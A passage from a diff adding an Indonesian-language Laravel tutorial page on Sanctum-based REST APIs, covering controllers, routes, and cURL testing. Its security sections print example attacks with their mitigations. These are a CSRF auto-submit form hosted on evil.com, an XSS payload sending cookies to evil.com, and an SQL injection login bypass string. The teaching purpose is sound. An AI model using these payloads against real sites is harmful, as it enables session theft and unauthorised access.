+    { <span class="str">"id"</span>: 2, <span class="str">"nama_produk"</span>: <span class="str">"Mouse"</span>,  <span class="str">"harga"</span>: 150000,  <span class="str">"stok"</span>: 50 }
+  ]
+}</code></pre>
+    </div>
+
+    <!-- CARA KERJA -->
+    <div class="section" id="cara-kerja">
+      <h2>Cara Kerja REST API dengan Sanctum</h2>
+      <pre><code>Client                          Laravel API
+  |                                |
+  |-- POST /api/login ----------&gt; |
+  |                                | validasi user + password
+  |&lt;-- { token: "abc123..." } ---|
+  |                                |
+  |-- GET /api/produk ----------&gt; |
+  |   Authorization: Bearer abc123 | cek token via Sanctum
+  |&lt;-- { data: [...] } ----------|</code></pre>
+      <ol>
+        <li>Client kirim username &amp; password ke endpoint login</li>
+        <li>Server validasi kredensial, buat token Sanctum, kirim balik ke client</li>
+        <li>Client simpan token (localStorage / secure storage)</li>
+        <li>Setiap request berikutnya sertakan token di header <code>Authorization: Bearer {token}</code></li>
+        <li>Sanctum middleware validasi token, lanjutkan request jika valid</li>
+      </ol>
+    </div>
+
+    <!-- PERSIAPAN -->
+    <div class="section" id="persiapan">
+      <h2>Persiapan Project</h2>
+      <p>Kita akan menambahkan REST API ke project <code>laravel-crud-app</code> yang sudah ada.</p>
+
+      <h3>Yang Sudah Ada</h3>
+      <ul>
+        <li>Model <code>Produk</code> dengan <code>$fillable</code></li>
+        <li>Migration tabel <code>produks</code></li>
+        <li>Web CRUD dengan <code>ProdukController</code></li>
+      </ul>
+
+      <h3>Yang Akan Ditambahkan</h3>
+      <ul>
+        <li>Laravel Sanctum untuk autentikasi API</li>
+        <li><code>AuthController</code> untuk login/logout/register via API</li>
+        <li><code>ProdukApiController</code> untuk CRUD produk via API</li>
+        <li>Routes API di <code>routes/api.php</code></li>
+      </ul>
+
+      <div class="callout">
+        <div class="callout-title">Pastikan Project Berjalan</div>
+        <code>php artisan serve</code> dan akses <code>http://localhost:8000/produk</code>
+        untuk memastikan CRUD web sudah berjalan sebelum lanjut.
+      </div>
+    </div>
+
+    <!-- INSTALL SANCTUM -->
+    <div class="section" id="install-sanctum">
+      <h2>Install &amp; Setup Sanctum</h2>
+
+      <h3>Langkah 1 &mdash; Install Package</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>composer require laravel/sanctum</code></pre>
+
+      <h3>Langkah 2 &mdash; Publish &amp; Migrate</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan vendor:publish --provider="Laravel\Sanctum\SanctumServiceProvider"
+php artisan migrate</code></pre>
+      <p>Ini membuat tabel <code>personal_access_tokens</code> di database untuk menyimpan token.</p>
+
+      <h3>Langkah 3 &mdash; Konfigurasi</h3>
+      <div class="pre-label">config/sanctum.php (default sudah OK)</div>
+      <pre><code><span class="str">'expiration'</span> =&gt; <span class="kw">null</span>,   <span class="cm">// null = token tidak expired</span>
+<span class="str">'expiration'</span> =&gt; <span class="nb">60</span> * <span class="nb">24</span>,  <span class="cm">// atau atur jam (dalam menit)</span></code></pre>
+
+      <div class="callout success">
+        <div class="callout-title">Laravel 12 &mdash; Sanctum Sudah Termasuk</div>
+        Di Laravel 12, Sanctum sudah di-include by default. Cukup jalankan
+        <code>php artisan migrate</code> jika belum.
+      </div>
+    </div>
+
+    <!-- SETUP USER -->
+    <div class="section" id="setup-user">
+      <h2>Setup User Model</h2>
+      <p>Tambahkan trait <code>HasApiTokens</code> ke model User agar bisa membuat Sanctum token.</p>
+      <div class="pre-label">app/Models/User.php</div>
+      <pre><code><span class="op">&lt;?php</span>
+<span class="kw">namespace</span> App\Models;
+
+<span class="kw">use</span> Illuminate\Foundation\Auth\User <span class="kw">as</span> Authenticatable;
+<span class="kw">use</span> Laravel\Sanctum\HasApiTokens;   <span class="cm">// tambahkan ini</span>
+
+<span class="kw">class</span> <span class="cl">User</span> <span class="kw">extends</span> <span class="cl">Authenticatable</span>
+{
+    <span class="kw">use</span> HasApiTokens;   <span class="cm">// tambahkan ini</span>
+
+    <span class="kw">protected</span> $fillable = [
+        <span class="str">'name'</span>, <span class="str">'email'</span>, <span class="str">'password'</span>,
+    ];
+
+    <span class="kw">protected</span> $hidden = [
+        <span class="str">'password'</span>, <span class="str">'remember_token'</span>,
+    ];
+}</code></pre>
+    </div>
+
+    <!-- SETUP BOOTSTRAP -->
+    <div class="section" id="setup-bootstrap">
+      <h2>Bootstrap API &amp; Middleware</h2>
+      <p>Di Laravel 12, konfigurasi API ada di <code>bootstrap/app.php</code>.</p>
+      <div class="pre-label">bootstrap/app.php</div>
+      <pre><code><span class="kw">use</span> Illuminate\Foundation\Application;
+<span class="kw">use</span> Illuminate\Foundation\Configuration\Exceptions;
+<span class="kw">use</span> Illuminate\Foundation\Configuration\Middleware;
+
+<span class="kw">return</span> <span class="cl">Application</span>::<span class="fn">configure</span>(<span class="fn">basePath</span>: <span class="fn">dirname</span>(__DIR__))
+    -&gt;<span class="fn">withRouting</span>(
+        web: <span class="fn">__DIR__</span>.<span class="str">'/../routes/web.php'</span>,
+        api: <span class="fn">__DIR__</span>.<span class="str">'/../routes/api.php'</span>,  <span class="cm">// pastikan ada</span>
+        commands: <span class="fn">__DIR__</span>.<span class="str">'/../routes/console.php'</span>,
+        health: <span class="str">'/up'</span>,
+    )
+    -&gt;<span class="fn">withMiddleware</span>(<span class="kw">function</span> (<span class="cl">Middleware</span> $middleware) {
+        $middleware-&gt;<span class="fn">statefulApi</span>();  <span class="cm">// aktifkan Sanctum stateful</span>
+    })
+    -&gt;<span class="fn">withExceptions</span>(<span class="kw">function</span> (<span class="cl">Exceptions</span> $exceptions) {})
+    -&gt;<span class="fn">create</span>();</code></pre>
+    </div>
+
+    <!-- AUTH CONTROLLER -->
+    <div class="section" id="auth-controller">
+      <h2>Auth Controller</h2>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:controller Api/AuthController</code></pre>
+      <div class="pre-label">app/Http/Controllers/Api/AuthController.php</div>
+      <pre><code><span class="op">&lt;?php</span>
+<span class="kw">namespace</span> App\Http\Controllers\Api;
+
+<span class="kw">use</span> App\Http\Controllers\Controller;
+<span class="kw">use</span> App\Models\User;
+<span class="kw">use</span> Illuminate\Http\Request;
+<span class="kw">use</span> Illuminate\Support\Facades\Hash;
+
+<span class="kw">class</span> <span class="cl">AuthController</span> <span class="kw">extends</span> <span class="cl">Controller</span>
+{
+    <span class="kw">public function</span> <span class="fn">register</span>(<span class="cl">Request</span> $request)
+    {
+        $request-&gt;<span class="fn">validate</span>([
+            <span class="str">'name'</span>     =&gt; <span class="str">'required|string|max:255'</span>,
+            <span class="str">'email'</span>    =&gt; <span class="str">'required|email|unique:users'</span>,
+            <span class="str">'password'</span> =&gt; <span class="str">'required|min:8|confirmed'</span>,
+        ]);
+
+        $user = <span class="cl">User</span>::<span class="fn">create</span>([
+            <span class="str">'name'</span>     =&gt; $request-&gt;name,
+            <span class="str">'email'</span>    =&gt; $request-&gt;email,
+            <span class="str">'password'</span> =&gt; <span class="cl">Hash</span>::<span class="fn">make</span>($request-&gt;password),
+        ]);
+
+        $token = $user-&gt;<span class="fn">createToken</span>(<span class="str">'auth_token'</span>)-&gt;plainTextToken;
+
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'token'</span>   =&gt; $token,
+            <span class="str">'user'</span>    =&gt; $user,
+        ], <span class="nb">201</span>);
+    }
+
+    <span class="kw">public function</span> <span class="fn">login</span>(<span class="cl">Request</span> $request)
+    {
+        $request-&gt;<span class="fn">validate</span>([
+            <span class="str">'email'</span>    =&gt; <span class="str">'required|email'</span>,
+            <span class="str">'password'</span> =&gt; <span class="str">'required'</span>,
+        ]);
+
+        $user = <span class="cl">User</span>::<span class="fn">where</span>(<span class="str">'email'</span>, $request-&gt;email)-&gt;<span class="fn">first</span>();
+
+        <span class="kw">if</span> (!$user || !<span class="cl">Hash</span>::<span class="fn">check</span>($request-&gt;password, $user-&gt;password)) {
+            <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+                <span class="str">'success'</span> =&gt; <span class="kw">false</span>,
+                <span class="str">'message'</span> =&gt; <span class="str">'Email atau password salah.'</span>,
+            ], <span class="nb">401</span>);
+        }
+
+        $token = $user-&gt;<span class="fn">createToken</span>(<span class="str">'auth_token'</span>)-&gt;plainTextToken;
+
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'token'</span>   =&gt; $token,
+            <span class="str">'user'</span>    =&gt; $user,
+        ]);
+    }
+
+    <span class="kw">public function</span> <span class="fn">logout</span>(<span class="cl">Request</span> $request)
+    {
+        $request-&gt;<span class="fn">user</span>()-&gt;<span class="fn">currentAccessToken</span>()-&gt;<span class="fn">delete</span>();
+
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'message'</span> =&gt; <span class="str">'Berhasil logout.'</span>,
+        ]);
+    }
+
+    <span class="kw">public function</span> <span class="fn">me</span>(<span class="cl">Request</span> $request)
+    {
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>($request-&gt;<span class="fn">user</span>());
+    }
+}</code></pre>
+    </div>
+
+    <!-- PRODUK API -->
+    <div class="section" id="produk-api">
+      <h2>Produk API Controller</h2>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:controller Api/ProdukApiController --api</code></pre>
+      <div class="pre-label">app/Http/Controllers/Api/ProdukApiController.php</div>
+      <pre><code><span class="op">&lt;?php</span>
+<span class="kw">namespace</span> App\Http\Controllers\Api;
+
+<span class="kw">use</span> App\Http\Controllers\Controller;
+<span class="kw">use</span> App\Models\Produk;
+<span class="kw">use</span> Illuminate\Http\Request;
+
+<span class="kw">class</span> <span class="cl">ProdukApiController</span> <span class="kw">extends</span> <span class="cl">Controller</span>
+{
+    <span class="kw">public function</span> <span class="fn">index</span>()
+    {
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'data'</span>    =&gt; <span class="cl">Produk</span>::<span class="fn">all</span>(),
+        ]);
+    }
+
+    <span class="kw">public function</span> <span class="fn">show</span>(<span class="cl">Produk</span> $produk)
+    {
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'data'</span>    =&gt; $produk,
+        ]);
+    }
+
+    <span class="kw">public function</span> <span class="fn">store</span>(<span class="cl">Request</span> $request)
+    {
+        $validated = $request-&gt;<span class="fn">validate</span>([
+            <span class="str">'nama_produk'</span> =&gt; <span class="str">'required|string|max:255'</span>,
+            <span class="str">'harga'</span>       =&gt; <span class="str">'required|numeric|min:1'</span>,
+            <span class="str">'stok'</span>        =&gt; <span class="str">'required|integer|min:0'</span>,
+            <span class="str">'deskripsi'</span>   =&gt; <span class="str">'nullable|string|max:500'</span>,
+        ]);
+
+        $produk = <span class="cl">Produk</span>::<span class="fn">create</span>($validated);
+
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'data'</span>    =&gt; $produk,
+        ], <span class="nb">201</span>);
+    }
+
+    <span class="kw">public function</span> <span class="fn">update</span>(<span class="cl">Request</span> $request, <span class="cl">Produk</span> $produk)
+    {
+        $validated = $request-&gt;<span class="fn">validate</span>([
+            <span class="str">'nama_produk'</span> =&gt; <span class="str">'required|string|max:255'</span>,
+            <span class="str">'harga'</span>       =&gt; <span class="str">'required|numeric|min:1'</span>,
+            <span class="str">'stok'</span>        =&gt; <span class="str">'required|integer|min:0'</span>,
+            <span class="str">'deskripsi'</span>   =&gt; <span class="str">'nullable|string|max:500'</span>,
+        ]);
+
+        $produk-&gt;<span class="fn">update</span>($validated);
+
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'data'</span>    =&gt; $produk,
+        ]);
+    }
+
+    <span class="kw">public function</span> <span class="fn">destroy</span>(<span class="cl">Produk</span> $produk)
+    {
+        $produk-&gt;<span class="fn">delete</span>();
+
+        <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([
+            <span class="str">'success'</span> =&gt; <span class="kw">true</span>,
+            <span class="str">'message'</span> =&gt; <span class="str">'Produk berhasil dihapus.'</span>,
+        ]);
+    }
+}</code></pre>
+    </div>
+
+    <!-- API ROUTES -->
+    <div class="section" id="api-routes">
+      <h2>API Routes</h2>
+      <div class="pre-label">routes/api.php</div>
+      <pre><code><span class="op">&lt;?php</span>
+<span class="kw">use</span> App\Http\Controllers\Api\AuthController;
+<span class="kw">use</span> App\Http\Controllers\Api\ProdukApiController;
+<span class="kw">use</span> Illuminate\Support\Facades\Route;
+
+<span class="cm">// -- Public routes -- (tidak perlu token)</span>
+<span class="cl">Route</span>::<span class="fn">post</span>(<span class="str">'/register'</span>, [<span class="cl">AuthController</span>::class, <span class="str">'register'</span>]);
+<span class="cl">Route</span>::<span class="fn">post</span>(<span class="str">'/login'</span>,    [<span class="cl">AuthController</span>::class, <span class="str">'login'</span>]);
+
+<span class="cm">// -- Protected routes -- (perlu token Sanctum)</span>
+<span class="cl">Route</span>::<span class="fn">middleware</span>(<span class="str">'auth:sanctum'</span>)-&gt;<span class="fn">group</span>(<span class="kw">function</span> () {
+
+    <span class="cl">Route</span>::<span class="fn">post</span>(<span class="str">'/logout'</span>, [<span class="cl">AuthController</span>::class, <span class="str">'logout'</span>]);
+    <span class="cl">Route</span>::<span class="fn">get</span>(<span class="str">'/me'</span>,     [<span class="cl">AuthController</span>::class, <span class="str">'me'</span>]);
+
+    <span class="cl">Route</span>::<span class="fn">apiResource</span>(<span class="str">'produk'</span>, <span class="cl">ProdukApiController</span>::class);
+});</code></pre>
+
+      <div class="callout">
+        <div class="callout-title">Prefix <code>/api</code> Otomatis</div>
+        Semua route di <code>routes/api.php</code> otomatis punya prefix <code>/api</code>.
+        Jadi <code>/login</code> di file ini bisa diakses via <code>http://localhost:8000/api/login</code>.
+      </div>
+
+      <h3>Daftar Endpoint API</h3>
+      <table>
+        <thead><tr><th>Method</th><th>Endpoint</th><th>Auth</th><th>Fungsi</th></tr></thead>
+        <tbody>
+          <tr><td><span class="badge badge-green">POST</span></td><td><code>/api/register</code></td><td>Tidak</td><td>Daftar akun baru</td></tr>
+          <tr><td><span class="badge badge-green">POST</span></td><td><code>/api/login</code></td><td>Tidak</td><td>Login &amp; dapat token</td></tr>
+          <tr><td><span class="badge badge-green">POST</span></td><td><code>/api/logout</code></td><td>Ya</td><td>Hapus token aktif</td></tr>
+          <tr><td><span class="badge badge-blue">GET</span></td><td><code>/api/me</code></td><td>Ya</td><td>Info user aktif</td></tr>
+          <tr><td><span class="badge badge-blue">GET</span></td><td><code>/api/produk</code></td><td>Ya</td><td>Daftar semua produk</td></tr>
+          <tr><td><span class="badge badge-blue">GET</span></td><td><code>/api/produk/{id}</code></td><td>Ya</td><td>Detail satu produk</td></tr>
+          <tr><td><span class="badge badge-green">POST</span></td><td><code>/api/produk</code></td><td>Ya</td><td>Buat produk baru</td></tr>
+          <tr><td><span class="badge badge-yellow">PUT</span></td><td><code>/api/produk/{id}</code></td><td>Ya</td><td>Update produk</td></tr>
+          <tr><td><span class="badge badge-red">DELETE</span></td><td><code>/api/produk/{id}</code></td><td>Ya</td><td>Hapus produk</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- TEST POSTMAN -->
+    <div class="section" id="test-postman">
+      <h2>Test dengan Postman</h2>
+
+      <h3>Setup Postman</h3>
+      <ol class="step-list">
+        <li>
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <h4>Buat Collection baru</h4>
+            <p>New &rarr; Collection &rarr; beri nama "Laravel API"</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <h4>Set Environment Variable</h4>
+            <p>New &rarr; Environment &rarr; tambah variabel:</p>
+            <ul>
+              <li><code>base_url</code> = <code>http://localhost:8000</code></li>
+              <li><code>token</code> = (kosong, akan diisi setelah login)</li>
+            </ul>
+          </div>
+        </li>
+        <li>
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <h4>Set Headers Default</h4>
+            <p>Di setiap request protected, tambah header:</p>
+            <ul>
+              <li><code>Accept: application/json</code></li>
+              <li><code>Authorization: Bearer {{token}}</code></li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h3>Alur Testing</h3>
+      <table>
+        <thead><tr><th>Langkah</th><th>Request</th><th>Yang Perlu Dicek</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td><span class="badge badge-green">POST</span> <code>/api/register</code></td><td>Status 201, ada <code>token</code> di response</td></tr>
+          <tr><td>2</td><td><span class="badge badge-green">POST</span> <code>/api/login</code></td><td>Status 200, salin nilai <code>token</code></td></tr>
+          <tr><td>3</td><td><span class="badge badge-blue">GET</span> <code>/api/me</code></td><td>Status 200, tampil data user</td></tr>
+          <tr><td>4</td><td><span class="badge badge-blue">GET</span> <code>/api/produk</code></td><td>Status 200, array data produk</td></tr>
+          <tr><td>5</td><td><span class="badge badge-green">POST</span> <code>/api/produk</code></td><td>Status 201, produk baru tersimpan</td></tr>
+          <tr><td>6</td><td><span class="badge badge-yellow">PUT</span> <code>/api/produk/1</code></td><td>Status 200, data terupdate</td></tr>
+          <tr><td>7</td><td><span class="badge badge-red">DELETE</span> <code>/api/produk/1</code></td><td>Status 200, <code>success: true</code></td></tr>
+          <tr><td>8</td><td><span class="badge badge-green">POST</span> <code>/api/logout</code></td><td>Status 200, token terhapus</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Body Request Login</h3>
+      <div class="pre-label">Body (raw JSON)</div>
+      <pre><code>{
+  <span class="str">"email"</span>: <span class="str">"test@example.com"</span>,
+  <span class="str">"password"</span>: <span class="str">"password123"</span>
+}</code></pre>
+
+      <h3>Body Request Store Produk</h3>
+      <div class="pre-label">Body (raw JSON)</div>
+      <pre><code>{
+  <span class="str">"nama_produk"</span>: <span class="str">"Laptop Gaming"</span>,
+  <span class="str">"harga"</span>: <span class="nb">12000000</span>,
+  <span class="str">"stok"</span>: <span class="nb">5</span>,
+  <span class="str">"deskripsi"</span>: <span class="str">"Laptop gaming RTX 4060"</span>
+}</code></pre>
+    </div>
+
+    <!-- TEST CURL -->
+    <div class="section" id="test-curl">
+      <h2>Test dengan cURL</h2>
+      <p>Alternatif testing via command line tanpa tool tambahan.</p>
+
+      <h3>Register</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>curl -X POST http://localhost:8000/api/register \
+  -H "Accept: application/json" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"Test User","email":"test@example.com","password":"password123","password_confirmation":"password123"}'</code></pre>
+
+      <h3>Login &amp; Simpan Token</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>curl -X POST http://localhost:8000/api/login \
+  -H "Accept: application/json" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"test@example.com","password":"password123"}'</code></pre>
+
+      <h3>Get Produk (dengan Token)</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>curl http://localhost:8000/api/produk \
+  -H "Accept: application/json" \
+  -H "Authorization: Bearer YOUR_TOKEN_HERE"</code></pre>
+
+      <h3>Create Produk</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>curl -X POST http://localhost:8000/api/produk \
+  -H "Accept: application/json" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
+  -d '{"nama_produk":"Keyboard","harga":500000,"stok":20}'</code></pre>
+    </div>
+
+    <!-- ERROR UMUM -->
+    <div class="section" id="error-umum">
+      <h2>Error Umum &amp; Solusi</h2>
+      <table>
+        <thead><tr><th>Error</th><th>Penyebab</th><th>Solusi</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><code>401 Unauthenticated</code></td>
+            <td>Token tidak ada atau sudah expired</td>
+            <td>Login ulang, gunakan token baru di header</td>
+          </tr>
+          <tr>
+            <td><code>422 Unprocessable Content</code></td>
+            <td>Validasi gagal</td>
+            <td>Cek field di response <code>errors</code>, perbaiki input</td>
+          </tr>
+          <tr>
+            <td><code>404 Not Found</code></td>
+            <td>Record tidak ada, atau route salah</td>
+            <td>Cek ID yang digunakan, cek <code>php artisan route:list</code></td>
+          </tr>
+          <tr>
+            <td><code>500 Server Error</code></td>
+            <td>Error PHP di server</td>
+            <td>Cek <code>storage/logs/laravel.log</code></td>
+          </tr>
+          <tr>
+            <td>Mendapat HTML bukan JSON</td>
+            <td>Header <code>Accept: application/json</code> tidak dikirim</td>
+            <td>Tambahkan header <code>Accept: application/json</code> di semua request API</td>
+          </tr>
+          <tr>
+            <td><code>Route [login] not defined</code></td>
+            <td>Redirect ke login page, bukan API response</td>
+            <td>Pastikan header <code>Accept: application/json</code> ada</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- CSRF -->
+    <div class="section" id="csrf">
+      <h2>Keamanan: CSRF Protection</h2>
+      <p><strong>CSRF</strong> (Cross-Site Request Forgery) adalah serangan dimana website jahat
+        memaksa browser korban melakukan request ke aplikasi kamu tanpa sepengetahuan korban.</p>
+
+      <h3>Skenario Serangan</h3>
+      <pre><code>1. User login ke bank.com (session aktif di browser)
+2. User buka evil.com yang berisi:
+   &lt;form action="https://bank.com/transfer" method="POST"&gt;
+     &lt;input name="amount" value="1000000"&gt;
+     &lt;input name="to" value="hacker_account"&gt;
+   &lt;/form&gt;
+   &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+3. Browser kirim request ke bank.com dengan cookie session user
+4. Transfer berhasil tanpa user tahu</code></pre>
+
+      <h3>Cara Laravel Mencegah CSRF</h3>
+      <p>Laravel menyertakan token acak di setiap form. Server menolak request POST yang tidak
+        menyertakan token yang cocok.</p>
+      <div class="pre-label">Blade View (web form)</div>
+      <pre><code>&lt;form method="POST" action="/transfer"&gt;
+  @csrf   <span class="cm">&lt;!-- menghasilkan: &lt;input type="hidden" name="_token" value="abc123..."&gt; --&gt;</span>
+  ...
+&lt;/form&gt;</code></pre>
+
+      <h3>CSRF di REST API</h3>
+      <div class="callout success">
+        <div class="callout-title">API Routes Tidak Kena CSRF</div>
+        Route di <code>routes/api.php</code> secara default <strong>tidak</strong> menggunakan
+        CSRF middleware. Proteksi di API dilakukan oleh token Sanctum di header
+        <code>Authorization</code>, bukan CSRF cookie.
+      </div>
+      <table>
+        <thead><tr><th>Aspek</th><th>Web Routes</th><th>API Routes</th></tr></thead>
+        <tbody>
+          <tr><td>CSRF Protection</td><td>Ya (<code>@csrf</code> di form)</td><td>Tidak perlu (pakai Bearer token)</td></tr>
+          <tr><td>Autentikasi</td><td>Session &amp; cookie</td><td>Sanctum Bearer token</td></tr>
+          <tr><td>Prefix</td><td><code>/</code></td><td><code>/api/</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- XSS -->
+    <div class="section" id="xss">
+      <h2>Keamanan: XSS Prevention</h2>
+      <p><strong>XSS</strong> (Cross-Site Scripting) adalah serangan dimana penyerang menyuntikkan
+        script berbahaya ke halaman web yang dilihat user lain.</p>
+
+      <h3>Skenario Serangan</h3>
+      <pre><code>Penyerang input nama produk: &lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;
+
+Kalau tidak di-escape:
+  &lt;td&gt;&lt;script&gt;... script jalan, cookie user dicuri &lt;/script&gt;&lt;/td&gt;
+
+Kalau di-escape (aman):
+  &lt;td&gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/td&gt;   &lt;!-- ditampilkan sebagai teks biasa --&gt;</code></pre>
+
+      <h3>Cara Laravel Mencegah XSS</h3>
+      <table>
+        <thead><tr><th>Situasi</th><th>Cara Aman</th><th>Cara Berbahaya</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>Tampilkan variabel di Blade</td>
+            <td><code>{{ $var }}</code> (auto-escape)</td>
+            <td><code>{!! $var !!}</code> (raw, tidak di-escape)</td>
+          </tr>
+          <tr>
+            <td>Input dari user</td>
+            <td>Gunakan <code>validate()</code> sebelum simpan</td>
+            <td>Langsung simpan tanpa validasi</td>
+          </tr>
+          <tr>
+            <td>Response API</td>
+            <td><code>response()->json($data)</code> (auto-escape JSON)</td>
+            <td>Echo raw HTML dari user input</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="callout warning">
+        <div class="callout-title">Hindari <code>{!! !!}</code></div>
+        Hanya gunakan <code>{!! $var !!}</code> jika kamu 100% yakin variabel berasal dari
+        sumber terpercaya (misalnya konten HTML yang kamu buat sendiri di CMS internal).
+        Jangan pernah gunakan untuk output dari input user.
+      </div>
+    </div>
+
+    <!-- SQL INJECTION -->
+    <div class="section" id="sql-injection">
+      <h2>Keamanan: SQL Injection</h2>
+      <p><strong>SQL Injection</strong> adalah serangan dimana penyerang menyisipkan perintah SQL
+        berbahaya melalui input form untuk memanipulasi query database.</p>
+
+      <h3>Skenario Serangan</h3>
+      <pre><code>Input email login: admin' OR '1'='1' --
+
+Query yang terbentuk (tanpa proteksi):
+  SELECT * FROM users WHERE email = 'admin' OR '1'='1' --' AND password = '...'
+
+Karena '1'='1' selalu TRUE, semua user dikembalikan.
+Penyerang bisa login sebagai user manapun tanpa password!</code></pre>
+
+      <h3>Cara Laravel Mencegah SQL Injection</h3>
+      <p>Eloquent ORM dan Query Builder menggunakan <strong>prepared statements</strong> secara
+        otomatis &mdash; input user tidak pernah langsung dimasukkan ke SQL string.</p>
+      <table>
+        <thead><tr><th>Cara</th><th>Aman?</th><th>Contoh</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>Eloquent ORM</td>
+            <td>&#x2705; Aman</td>
+            <td><code>Produk::where('nama', $input)->get()</code></td>
+          </tr>
+          <tr>
+            <td>Query Builder</td>
+            <td>&#x2705; Aman</td>
+            <td><code>DB::table('produk')->where('nama', $input)->get()</code></td>
+          </tr>
+          <tr>
+            <td>Raw query dengan binding</td>
+            <td>&#x2705; Aman</td>
+            <td><code>DB::select('SELECT * FROM produk WHERE id = ?', [$id])</code></td>
+          </tr>
+          <tr>
+            <td>Raw query tanpa binding</td>
+            <td>&#x274C; Berbahaya</td>
+            <td><code>DB::select("SELECT * WHERE id = $id")</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="callout success">
+        <div class="callout-title">Eloquent Aman by Default</div>
+        Selama menggunakan Eloquent atau Query Builder dengan parameter binding,
+        Laravel otomatis mencegah SQL injection. Hindari menggabungkan string user input
+        langsung ke query SQL mentah.
+      </div>
+    </div>
+
+    <!-- JWT ALTERNATIF -->
+    <div class="section" id="jwt-alternatif">
+      <h2>REST API &rarr; JWT</h2>
+      <p>
+        Sanctum cocok untuk aplikasi first-party (SPA/mobile buatan sendiri) karena tokennya
+        disimpan di database dan gampang di-revoke. Kalau API kamu perlu dikonsumsi pihak
+        ketiga atau butuh token stateless (tidak menyentuh DB tiap request), pakai
+        <strong>JWT (JSON Web Token)</strong> sebagai alternatif.
+      </p>
+      <table>
+        <thead><tr><th>Aspek</th><th>Sanctum</th><th>JWT</th></tr></thead>
+        <tbody>
+          <tr><td>Penyimpanan token</td><td>Tabel <code>personal_access_tokens</code></td><td>Tidak disimpan &mdash; self-contained</td></tr>
+          <tr><td>Revoke token</td><td>Mudah, hapus baris di DB</td><td>Butuh strategi tambahan (blacklist/short expiry)</td></tr>
+          <tr><td>Cocok untuk</td><td>SPA &amp; mobile first-party</td><td>API publik, integrasi multi-service</td></tr>
+        </tbody>
+      </table>
+      <div class="callout">
+        <div class="callout-title">Lanjutkan ke Workshop JWT</div>
+        Implementasi lengkap &mdash; install package, konfigurasi guard, <code>JwtAuthController</code>,
+        sampai refresh token &mdash; didokumentasikan terpisah di
+        <a href="modul-rest-api-jwt.html"><strong>Workshop JWT Authentication</strong></a>.
+      </div>
+    </div>
+
+    <!-- RINGKASAN -->
+    <div class="section" id="ringkasan">
+      <h2>Ringkasan Minggu 1</h2>
+      <p>Berikut recap semua yang telah dipelajari di Minggu 1:</p>
+
+      <h3>CRUD Produk (Web)</h3>
+      <table>
+        <thead><tr><th>Komponen</th><th>File</th><th>Fungsi</th></tr></thead>
+        <tbody>
+          <tr><td>Migration</td><td><code>database/migrations/</code></td><td>Definisi struktur tabel</td></tr>
+          <tr><td>Model</td><td><code>app/Models/Produk.php</code></td><td>Representasi tabel + <code>$fillable</code></td></tr>
+          <tr><td>Controller</td><td><code>app/Http/Controllers/ProdukController.php</code></td><td>Logic CRUD + validasi</td></tr>
+          <tr><td>Views</td><td><code>resources/views/produk/</code></td><td>Template Blade (index, create, edit)</td></tr>
+          <tr><td>Routes</td><td><code>routes/web.php</code></td><td><code>Route::resource()</code> &rarr; 6 routes</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Eloquent, Relasi &amp; Query Optimization</h3>
+      <table>
+        <thead><tr><th>Topik</th><th>Inti</th></tr></thead>
+        <tbody>
+          <tr><td>Query dasar</td><td><code>where()</code>, <code>find()</code>, <code>orderBy()</code>, <code>paginate()</code></td></tr>
+          <tr><td>Relasi</td><td><code>belongsTo</code>, <code>hasMany</code>, <code>hasOne</code>, <code>belongsToMany</code></td></tr>
+          <tr><td>N+1 Query</td><td>Query relasi yang terulang di dalam loop &mdash; hindari dengan <code>with()</code></td></tr>
